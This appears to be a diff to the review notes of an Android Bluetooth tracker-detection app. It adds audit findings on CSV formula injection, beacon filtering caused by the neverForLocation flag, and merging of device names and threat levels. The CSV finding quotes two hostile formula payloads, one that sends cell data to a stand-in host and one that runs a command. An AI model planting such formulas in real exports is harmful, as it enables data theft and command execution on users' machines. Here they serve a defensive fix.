@@ -70,7 +70,7 @@ Any device broadcasting with no name (or a generic placeholder) and a signal str
 - Permissions granted at runtime:
   - `BLUETOOTH_SCAN` + `BLUETOOTH_CONNECT` (Android 12+)
   - `BLUETOOTH` + `BLUETOOTH_ADMIN` (Android 6–11)
-  - `ACCESS_FINE_LOCATION` (required by Android for BLE scanning on API 23–30)
+  - `ACCESS_FINE_LOCATION` (required by Android for BLE scan results on API 23–30, and kept on 12+ because the app does not assert `neverForLocation` — see BUG-11)
   - `POST_NOTIFICATIONS` (Android 13+, required to show the scan status and HIGH RISK alert notifications)
 
 ---
@@ -384,13 +384,55 @@ A follow-up code review (after the initial crash-fix round) found and fixed the 
 
 ---
 
+## Sixth Review Pass — Security Audit & Detection Fixes
+
+### SEC-6 — CSV formula injection in exported scan results
+**Severity:** Medium  
+**File:** `MainActivity.kt`
+
+**Issue:** `escapeCsv()` only doubled quotes per RFC 4180. Bluetooth device names are fully attacker-controlled — anyone in radio range can advertise a name like `=HYPERLINK("http://evil.example/"&A1,"open")` or `=cmd|' /C calc'!A0`. When the exported CSV was opened in Excel, Google Sheets, or LibreOffice, such a field was interpreted as a live formula, enabling data exfiltration or (after a warning prompt) command execution on the analyst's machine — a classic CSV/formula-injection attack against exactly the person investigating the hostile device.
+
+**Fix:** `escapeCsv()` now also prefixes any field starting with `=`, `+`, `-`, `@`, tab, or carriage return with a single apostrophe, which spreadsheets treat as a text marker. Quote-doubling is unchanged.
+
+---
+
+### BUG-11 — `neverForLocation` made Android hide the very beacons the app hunts
+**Severity:** High  
+**File:** `AndroidManifest.xml`
+
+**Issue:** `BLUETOOTH_SCAN` was declared with `android:usesPermissionFlags="neverForLocation"`. On Android 12+, that assertion tells the OS the app never derives location from scans — and in exchange the system **filters beacon-style advertisements out of the app's scan results**. For a tracker-detection app this is self-defeating: AirTags, Tiles, and generic BLE beacons are precisely the advertisement formats most at risk of being filtered, so the app could silently miss real trackers on modern devices. (Established tracker-detection apps like AirGuard avoid this flag for the same reason.)
+
+**Fix:** Removed the `neverForLocation` flag. The app already declares and requests `ACCESS_FINE_LOCATION` on Android 12+ (it was in `requiredPermissions` for API 31+ all along), which is the requirement that removing the flag brings back. The Requirements and Limitations sections above were updated to match.
+
+---
+
+### BUG-12 — Late-arriving device names were permanently discarded
+**Severity:** Medium  
+**File:** `ScanService.kt` / `MainActivity.kt` / `DeviceAdapter.kt`
+
+**Issue:** Two compounding problems. First, `broadcastDevice()` sent `info.displayName` — so a device whose name wasn't in the first advertisement was broadcast as the literal string `"Unknown Device"`, indistinguishable from a real name. Second, `DeviceAdapter.upsert()`'s update path copied only `rssi`/`lastSeen`/`seenCount`/threat fields, never `name`, `manufacturer`, or `deviceType`. BLE devices very commonly advertise without a name first (name arrives in a later packet or scan response), so most devices stayed "Unknown Device" in the list forever even after their real name was received.
+
+**Fix:** The broadcast now carries the raw name (empty when absent), `buildDeviceFromIntent()` maps blank back to `null` so `displayName` falls back correctly, and `upsert()` now merges `name`/`manufacturer` (keeping the previous value when the new sighting omits it) and refreshes `deviceType`. The service-side `knownDevices` snapshot merges the same way.
+
+---
+
+### BUG-13 — Threat level could silently downgrade on later sightings
+**Severity:** High  
+**File:** `DeviceAdapter.kt` / `ScanService.kt`
+
+**Issue:** Each sighting is classified independently from whatever data that one advertisement carried. A spy camera named "SQ11" (HIGH risk by name) with a generic OUI would be re-classified UNKNOWN the moment an advertisement arrived without the name field — and `upsert()` blindly overwrote the threat level, erasing the red HIGH RISK warning from the list while the device was still present. The user could watch a confirmed tracker fade to "no known signatures".
+
+**Fix:** Both `DeviceAdapter.upsert()` and the service-side `knownDevices` merge now keep the most severe classification seen so far (HIGH has the lowest enum ordinal), including its reason text. `upsert()`'s return value now means "re-sort needed" — true for new devices **or** when an existing device's threat level escalates, so the list re-orders when a device is upgraded, not just on first sight.
+
+---
+
 ## Limitations & Notes
 
 - **BLE-only devices** (like AirTags) are only visible during their advertisement windows. Apple's AirTag rotates its MAC address periodically to prevent tracking — this app will show it as a new device each rotation cycle.
 - **Classic Bluetooth** discovery takes approximately 12 seconds per cycle and requires the remote device to be in discoverable mode. Many spy devices only use BLE.
 - **MAC OUI matching** is heuristic — the same chip vendor supplies components for both legitimate consumer devices and spy hardware. MEDIUM-risk flags for OUI matches should be investigated, not treated as confirmed.
 - **`isScanning` UI flag** — if the OS kills the foreground service due to memory pressure (rather than the activity being recreated), the FAB may still show "Stop Scan" while no scan is actually running, since `ScanService.isRunning` would also be reset to `false` only if `onDestroy()` runs. Tapping "Stop Scan" then "Start Scan" will recover the state.
-- **Location permission** is not used for location purposes — Android mandates it for any app that performs Bluetooth scanning on API 23–30.
+- **Location permission** is not used for location purposes — Android mandates it for Bluetooth scan results on API 23–30, and on 12+ it remains required because the app deliberately does not assert `neverForLocation` (doing so would filter beacon advertisements out of scan results — see BUG-11).
 - The app does **not** connect to any detected device, only passively observes advertisements and inquiry responses.
 
 ---
